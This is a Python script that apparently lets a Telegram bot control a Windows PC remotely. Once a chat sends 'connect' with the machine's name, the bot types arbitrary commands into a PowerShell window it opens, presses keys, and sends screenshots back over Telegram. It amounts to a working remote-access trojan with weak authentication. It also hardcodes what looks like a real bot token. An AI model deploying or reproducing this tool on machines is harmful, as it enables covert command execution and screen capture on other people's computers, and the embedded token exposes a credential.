from telegram import Bot
from os import system,getenv
from PIL import ImageGrab
from keyboard import write,press_and_release

#botid = 881636870
def action(query,chatid,bot,use=''):
    if use != '':
        query = use+' '+query
    queryl = query.lower()
    q = list(queryl.split(' '))
    try:
        if q[len(q)-1] == 'times':
            for i in range(int(q[len(q)-2])):
                action(' '.join(q[:len(q)-2]),chatid,bot,use)
        elif q[0] == 'start':
            system(q[0]+' '+q[1])
            press_and_release('alt+enter')
        elif q[0] == 'type':
            write(query[5:len(query)])
        elif q[0] == 'cmd':
            write(query[4:len(query)])
            press_and_release('enter')
        elif q[0] == 'press':
            press_and_release(q[1])
        elif q[0] == 'hold':
            press_and_release(q[1],do_release=False)
        elif q[0] == 'release':
            press_and_release(q[1],do_press=False)
        elif q[0] == 'switch':
            press_and_release('alt+tab')
        elif q[0] == 'close':
            press_and_release('alt+f4')
        elif q[0] == 'screen':
            f = ImageGrab.grab()
            f.save('D:\screen.png')
            fi  = open('D:\screen.png','rb')
            bot.send_photo(chat_id=chatid,photo=fi)
            fi.close()
    except:
        t ="Sorry boss , I couldn't do '"+query+"' "+", because "+getenv('COMPUTERNAME')+" went offline." 
        while True:
            try:
                bot.send_message(chat_id=chatid,text=t)
                break
            except:
                continue
    pass
        
        


def main():
    bot = Bot(token='967475402:AAEoyQi5ilc3nNV6M6b1SWHliNqVsVzEuRc')
    while True:
        try:
            m = bot.get_updates()[-1]
            break
        except:
            continue
    use = ''
    
    allow=[]
    while True:
        while True:
            try:
                n = bot.get_updates(offset=m.update_id)[-1]
                break
            except:
                lastchatid = n.message.chat_id
                if lastchatid not in allow:
                    break
                t = "Sorry boss , I couldn't do from query '"+m.message.text+"' to now, because "+getenv('COMPUTERNAME')+" went offline." 
                while True:
                    try:
                        bot.send_message(chat_id=lastchatid,text=t)
                        break
                    except:
                        continue
        if m.update_id != n.update_id:
            q = n.message.text
            if q[:7].lower() == 'connect':
                if q[8:len(q)] == getenv('COMPUTERNAME') and n.message.chat_id not in allow :
                    t = getenv('COMPUTERNAME')+' '+'connected'
                    lastchatid = n.message.chat_id
                    try:
                        bot.send_message(chat_id=lastchatid,text=t)
                        allow.append(n.message.chat_id)
                    except:
                        pass
                    
                    if len(allow) == 1:
                        system('start powershell')
                        press_and_release('alt+enter')
            elif q[:10].lower() == 'disconnect':
                if q[11:len(q)] == getenv('COMPUTERNAME') and n.message.chat_id in allow:
                    allow.remove(n.message.chat_id)
                    if allow == []:
                        write('exit')
                        press_and_release('enter')
                    t = getenv('COMPUTERNAME')+' '+'disconnected'
                    lastchatid = n.message.chat_id
                    while True:
                        try:
                            bot.send_message(chat_id=lastchatid,text=t)
                            break
                        except:
                            continue
            elif q[:6].lower() == 'online':
                try:
                    bot.send_message(chat_id=n.message.chat_id,text=getenv('COMPUTERNAME'))
                except:
                    pass
            elif q[:3].lower() == 'use':
                use = q[4:len(q)]
            elif q[:5].lower() == 'unuse':
                use=''
            elif n.message.chat_id in allow:
                action(q,n.message.chat_id,bot,use)
            m = n


if __name__ == "__main__":
    main()


        
        
        
    


